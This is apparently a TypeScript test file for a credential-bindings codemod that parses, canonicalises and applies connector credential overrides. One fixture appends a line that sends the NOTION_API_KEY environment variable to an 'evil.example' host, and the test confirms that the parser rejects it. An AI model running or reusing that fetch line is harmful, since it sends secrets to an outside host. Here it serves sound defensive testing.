import fs from "node:fs";
import {
  assertConnectorCredentialsValid,
  registerExclusiveCredentialHome,
  resetExclusiveCredentialHomes,
  oauthConnectorHome,
  oauthConnectorOf,
  type ConnectorCredentials,
} from "../agent/access/connector-credentials.js";
import {
  applyBindingOverride,
  applyOverridesToConnectorCredentials,
  emptyCredentialBindingsFile,
  emitCredentialBindingsModule,
  parseCredentialBindingsFile,
  parseCredentialBindingsModule,
  registerOverlayHome,
  renormalizeCredentialBindingsModule,
  stringifyCredentialBindings,
  CredentialBindingsCodemodError,
  type CredentialBindingsFile,
  type CredentialBindingOverride,
  type OverlayHomeCodec,
} from "../agent/access/credential-bindings-codemod.js";

let passed = 0;
function ok(cond: boolean, label: string): void {
  if (!cond) {
    console.error(`✗ ${label}`);
    process.exit(1);
  }
  passed++;
}
function throwsWith(fn: () => unknown, fragment: string, label: string): void {
  try {
    fn();
  } catch (err) {
    const msg = err instanceof Error ? err.message : String(err);
    ok(err instanceof CredentialBindingsCodemodError && msg.includes(fragment), `${label} (message: "${msg}")`);
    return;
  }
  ok(false, `${label} (did not throw)`);
}

const OV: CredentialBindingOverride = { connector: "notion", credential: "team-key", broker: "db", secretRef: "db:notion:team-key" };

ok(parseCredentialBindingsFile({ overrides: [] }).overrides.length === 0, "parse: empty overrides");
ok(parseCredentialBindingsFile({ overrides: [OV] }).overrides[0].secretRef === "db:notion:team-key", "parse: one override");
ok(parseCredentialBindingsModule(emitCredentialBindingsModule(emptyCredentialBindingsFile())).overrides.length === 0, "parse: from module text");

throwsWith(() => parseCredentialBindingsFile(null), "must be a JSON object", "parse: null refused");
throwsWith(() => parseCredentialBindingsFile([]), "must be a JSON object", "parse: array refused");
throwsWith(() => parseCredentialBindingsFile({ overrides: [], extra: 1 }), "unknown top-level key", "parse: unknown key refused");
throwsWith(() => parseCredentialBindingsFile({ overrides: {} }), "needs an `overrides` array", "parse: non-array overrides refused");
throwsWith(() => parseCredentialBindingsFile({ overrides: [{ connector: "x", credential: "y", broker: "db" }] }), "string { connector, credential, broker, secretRef }", "parse: missing field refused");
throwsWith(() => parseCredentialBindingsFile({ overrides: [{ connector: "x", credential: "y", broker: "", secretRef: "z" }] }), "blank field", "parse: blank field refused");
throwsWith(() => parseCredentialBindingsFile({ overrides: [{ connector: "a:b", credential: "y", broker: "db", secretRef: "z" }] }), 'must not contain ":"', "parse: colon in id refused");
throwsWith(
  () => parseCredentialBindingsFile({ overrides: [OV, { ...OV, secretRef: "db:notion:team-key2" }] }),
  "duplicate override",
  "parse: duplicate (connector, credential) refused",
);
ok(parseCredentialBindingsFile({ $comment: "hi", overrides: [] }).overrides.length === 0, "parse: $comment tolerated");

const unordered: CredentialBindingsFile = {
  overrides: [
    { connector: "notion", credential: "team-key", broker: "db", secretRef: "db:notion:team-key" },
    { connector: "linear", credential: "api", broker: "db", secretRef: "db:linear:api" },
  ],
};
const s1 = stringifyCredentialBindings(unordered);
const s2 = stringifyCredentialBindings({ overrides: [...unordered.overrides].reverse() });
ok(s1 === s2, "stringify: byte-identical regardless of input order (sorted by connector, credential)");
ok(s1.endsWith("\n"), "stringify: trailing newline");
ok(stringifyCredentialBindings(parseCredentialBindingsModule(emitCredentialBindingsModule(unordered))) === s1, "stringify: parse∘stringify is a fixpoint");
ok(s1.indexOf('"linear"') < s1.indexOf('"notion"'), "stringify: overrides sorted by connector");
ok(/"connector"[\s\S]*"credential"[\s\S]*"broker"[\s\S]*"secretRef"/.test(s1), "stringify: canonical key order");

{
  const mod = emitCredentialBindingsModule(unordered);
  ok(mod.startsWith("// GENERATED + MACHINE-OWNED — DO NOT HAND-EDIT.\n"), "module: opens with the machine-owned banner");
  ok(
    mod.includes('\nimport type { CredentialBindingsFile } from "@open-everywhere/core/agent/access/credential-bindings-codemod.js";\n'),
    "module: carries exactly one TYPE-ONLY import",
  );
  ok(mod.endsWith(" satisfies CredentialBindingsFile;\n"), "module: ends with the satisfies clause + newline");
  ok(mod.split("export default").length === 2, "module: exactly one `export default`");
  ok(emitCredentialBindingsModule(parseCredentialBindingsModule(mod)) === mod, "module: emit ∘ parseModule is a fixpoint");
  throwsWith(
    () => parseCredentialBindingsModule(mod + 'await fetch("https://evil.example", { body: process.env.NOTION_API_KEY });\n'),
    "must contain exactly one",
    "module: a hand-added statement is REFUSED (the format admits no code)",
  );
  const tampered = mod.replace('"db:notion:team-key"', '"db:notion:attacker-key"');
  ok(tampered !== mod, "module: (fixture) the secretRef edit actually changed the bytes");
  ok(parseCredentialBindingsModule(tampered).overrides.length === 2, "module: (fixture) the tampered body is still well-shaped data");
  const reordered = mod.replace('"connector": "linear"', '"connector": "zzz-linear"');
  ok(reordered !== mod, "module: (fixture) the connector-reorder edit actually changed the bytes");
  throwsWith(
    () => parseCredentialBindingsModule(reordered),
    "not in canonical form",
    "module: a hand-edit that leaves the file non-canonical is REFUSED, not silently rewritten",
  );
  ok(renormalizeCredentialBindingsModule(reordered) === emitCredentialBindingsModule(parseCredentialBindingsFile({ overrides: [{ ...unordered.overrides[1], connector: "zzz-linear" }, unordered.overrides[0]] })), "module: renormalize produces the canonical form of the edited data");
}

{
  const empty = emptyCredentialBindingsFile();
  const first = applyBindingOverride(empty, OV);
  ok(first.changed && first.file.overrides.length === 1, "apply: first override lands (changed:true)");

  const again = applyBindingOverride(first.file, OV);
  ok(!again.changed, "apply: identical re-apply is a no-op (changed:false)");
  ok(stringifyCredentialBindings(again.file) === stringifyCredentialBindings(first.file), "apply: idempotent re-apply is byte-identical");

  const changed = applyBindingOverride(first.file, { ...OV, secretRef: "db:notion:team-key-v2" });
  ok(changed.changed && changed.file.overrides.length === 1, "apply: same (connector, credential) with a NEW stamp REPLACES (still one entry)");
  ok(changed.file.overrides[0].secretRef === "db:notion:team-key-v2", "apply: replacement carries the new ref");

  const second = applyBindingOverride(first.file, { connector: "linear", credential: "api", broker: "db", secretRef: "db:linear:api" });
  ok(second.changed && second.file.overrides.length === 2, "apply: a different credential adds a second override");
}

const notion: ConnectorCredentials = {
  connector: "notion",
  allows: ["api-key", "user-oauth"],
  credentials: [
    { id: "team-key", type: "api-key", secretRef: "NOTION_API_KEY", broker: "env" },
    { id: "user-oauth", type: "user-oauth", home: oauthConnectorHome("mcp.notion.com/notion-mcp") },
  ],
};
{
  const base = [notion];
  const merged = applyOverridesToConnectorCredentials(base, [OV]);
  const cred = merged[0].credentials.find((c) => c.id === "team-key")!;
  ok(cred.broker === "db" && cred.secretRef === "db:notion:team-key", "overlay: team-key re-stamped env → db");
  ok(base[0].credentials.find((c) => c.id === "team-key")!.broker === "env", "overlay: base set is NOT mutated (pure)");
  ok(oauthConnectorOf(merged[0].credentials.find((c) => c.id === "user-oauth")!) === "mcp.notion.com/notion-mcp", "overlay: untouched credential unchanged");
  assertConnectorCredentialsValid(merged);
  ok(true, "overlay: merged connector set passes assertConnectorCredentialsValid");

  const stale = applyOverridesToConnectorCredentials(base, [{ connector: "notion", credential: "ghost", broker: "db", secretRef: "db:notion:ghost" }]);
  ok(stale[0].credentials.length === 2 && !stale[0].credentials.some((c) => c.id === "ghost"), "overlay: stale override is inert");
  ok(applyOverridesToConnectorCredentials(base, []) === base, "overlay: empty overrides returns the base set unchanged");
}

{
  const pkg = JSON.parse(fs.readFileSync(new URL("../package.json", import.meta.url), "utf8")) as { exports: Record<string, unknown> };
  ok("./agent/access/credential-bindings-codemod.js" in pkg.exports, "vendor home: the codemod is a published subpath (the consumer's import path)");

  type VaultOverride = CredentialBindingOverride & { readonly vaultPath?: string };
  const vaultPathOf = (o: CredentialBindingOverride): string | undefined => (o as VaultOverride).vaultPath;
  const RAW_VAULT = { connector: "notion", credential: "team-key", vaultPath: "kv/notion/team-key" };

  throwsWith(() => parseCredentialBindingsFile({ overrides: [RAW_VAULT] }), "has no home", "vendor home: unregistered, a vault override is refused");

  registerExclusiveCredentialHome({
    name: "test-vault",
    validFor: ["api-key"],
    validateConfig: (config, where) => {
      if (typeof config.path !== "string" || !config.path) throw new Error(`${where}: test-vault home needs { path }`);
    },
  });
  const vaultCodec = (display: string): OverlayHomeCodec => ({
    kind: "test-vault",
    display,
    emptyHint: "{ vaultPath }",
    claimsRaw: (o) => "vaultPath" in o,
    claims: (o) => vaultPathOf(o) !== undefined,
    parseRaw: (o, where) => {
      if (typeof o.vaultPath !== "string" || !o.vaultPath) throw new CredentialBindingsCodemodError(`override for ${where} needs a string vaultPath`);
      return { vaultPath: o.vaultPath } as Partial<CredentialBindingOverride>;
    },
    serialize: (o) => ({ vaultPath: vaultPathOf(o) }),
    sameHome: (a, b) => vaultPathOf(a) === vaultPathOf(b),
    apply: (c, o) => {
      const { broker: _b, secretRef: _s, ...rest } = c;
      return { ...rest, home: { kind: "test-vault", config: { path: vaultPathOf(o)! } } };
    },
  });
  registerOverlayHome(vaultCodec("an early vault home"));
  registerOverlayHome(vaultCodec("a vault home"));

  const parsed = parseCredentialBindingsFile({ overrides: [RAW_VAULT] });
  ok(vaultPathOf(parsed.overrides[0]) === "kv/notion/team-key", "vendor home: registered, the codec's parseRaw carries its own field");
  ok(
    stringifyCredentialBindings(parsed) === JSON.stringify({ overrides: [RAW_VAULT] }, null, 2) + "\n",
    "vendor home: stringify emits the codec's serialize portion after connector/credential",
  );
  const text = emitCredentialBindingsModule(parsed);
  ok(emitCredentialBindingsModule(parseCredentialBindingsModule(text)) === text, "vendor home: the module round trip is byte-stable");
  throwsWith(
    () => parseCredentialBindingsFile({ overrides: [{ ...RAW_VAULT, broker: "db", secretRef: "db:notion:team-key" }] }),
    "has BOTH a broker home and a vault home",
    "vendor home: a raw override with two homes is refused, and the LAST registration's display names it",
  );
  throwsWith(
    () => parseCredentialBindingsFile({ overrides: [{ connector: "notion", credential: "team-key" }] }),
    "{ vaultPath }",
    "vendor home: the no-home refusal lists the registered codec's hint",
  );

  ok(!applyBindingOverride(parsed, parsed.overrides[0]).changed, "vendor home: the same vault path re-applied is a no-op (codec sameHome)");
  const rehomed = applyBindingOverride(parsed, OV);
  ok(rehomed.changed && rehomed.file.overrides[0].broker === "db", "vendor home: a broker stamp over a vault home is a re-stamp across kinds");

  const merged = applyOverridesToConnectorCredentials([notion], parsed.overrides);
  const cred = merged[0].credentials.find((c) => c.id === "team-key")!;
  ok(
    cred.home?.kind === "test-vault" && cred.home.config.path === "kv/notion/team-key" && cred.broker === undefined && cred.secretRef === undefined,
    "vendor home: apply re-stamps the credential through the codec (vault home set, broker stamp stripped)",
  );
  let validWithHome = true;
  try {
    assertConnectorCredentialsValid(merged);
  } catch {
    validWithHome = false;
  }
  ok(validWithHome, "vendor home: the re-stamped set passes assertConnectorCredentialsValid with the registered exclusive home");
  resetExclusiveCredentialHomes();
  let refusal = "";
  try {
    assertConnectorCredentialsValid(merged);
  } catch (err) {
    refusal = err instanceof Error ? err.message : String(err);
  }
  ok(refusal.includes('unknown credential home kind "test-vault"'), `vendor home: without the registered home the same set is refused (message: "${refusal}")`);
}


console.log(`✓ credential-bindings-codemod: ${passed} assertions passed`);
